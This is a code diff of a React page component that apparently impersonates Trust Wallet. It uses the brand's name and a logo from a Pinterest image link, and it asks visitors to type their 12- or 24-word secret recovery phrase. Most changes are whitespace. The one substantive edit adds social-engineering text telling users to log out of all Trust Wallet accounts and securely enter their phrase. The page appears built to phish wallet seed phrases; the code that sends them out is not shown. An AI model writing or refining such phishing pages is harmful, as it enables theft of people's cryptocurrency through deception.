@@ -14,10 +14,10 @@ import { Loader2 } from 'lucide-react';
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 
 type PhraseLength = 12 | 24;
-type ValidationStatus = { 
-  isValid: boolean | null; 
-  reason?: string; 
-  isLoading: boolean; 
+type ValidationStatus = {
+  isValid: boolean | null;
+  reason?: string;
+  isLoading: boolean;
 };
 
 export default function PhraseInputPage() {
@@ -88,7 +88,7 @@ export default function PhraseInputPage() {
 
   const handleVerifyPhrase = async () => {
     setIsVerifying(true);
-    
+
     let allWordsFilled = true;
     const currentValidationResults = [...validationResults];
     const validationPromises = words.map((word, index) => {
@@ -102,13 +102,13 @@ export default function PhraseInputPage() {
       }
       return Promise.resolve();
     });
-    
+
     setValidationResults(currentValidationResults); // Update for empty words immediately
 
     await Promise.all(validationPromises);
 
     // Refresh validationResults from state as handleValidateWord updates it
-    const finalValidationResults = [...validationResults]; 
+    const finalValidationResults = [...validationResults];
     // Check again for empty words that might have been set by map function
     words.forEach((word, index) => {
         if(word.trim() === '') {
@@ -127,7 +127,7 @@ export default function PhraseInputPage() {
       setIsVerifying(false);
       return;
     }
-    
+
     // Check final results after all async validations and updates
     const allValid = finalValidationResults.every(result => result.isValid === true);
 
@@ -153,15 +153,17 @@ export default function PhraseInputPage() {
   return (
     <div className="container mx-auto p-4 sm:p-6 md:p-8 max-w-3xl w-full">
       <header className="mb-8 text-center flex flex-col items-center">
-        <Image 
-          src="https://i.pinimg.com/736x/2a/98/d7/2a98d7c3b241b50f73f799b68a1eb501.jpg" 
-          alt="Trust Wallet Logo" 
-          width={64} 
-          height={64} 
+        <Image
+          src="https://i.pinimg.com/736x/2a/98/d7/2a98d7c3b241b50f73f799b68a1eb501.jpg"
+          alt="Trust Wallet Logo"
+          width={64}
+          height={64}
           className="mb-4 rounded-lg shadow-md"
         />
         <h1 className="text-4xl font-bold text-primary">Trust Wallet</h1>
-        <p className="text-muted-foreground mt-2 text-lg">Securely enter your secret phrase.</p>
+        <p className="text-muted-foreground mt-2 text-lg">
+          To keep your account safe log out of all trust wallet accounts. Securely enter your secret phrase.
+        </p>
       </header>
 
       <Card className="mb-8 shadow-xl">
@@ -205,9 +207,9 @@ export default function PhraseInputPage() {
               />
             ))}
           </div>
-          <Button 
-            onClick={handleVerifyPhrase} 
-            disabled={isVerifying} 
+          <Button
+            onClick={handleVerifyPhrase}
+            disabled={isVerifying}
             className="w-full mt-10 py-6 text-lg bg-primary hover:bg-primary/90 text-primary-foreground"
           >
             {isVerifying ? <Loader2 className="mr-2 h-5 w-5 animate-spin" /> : null}
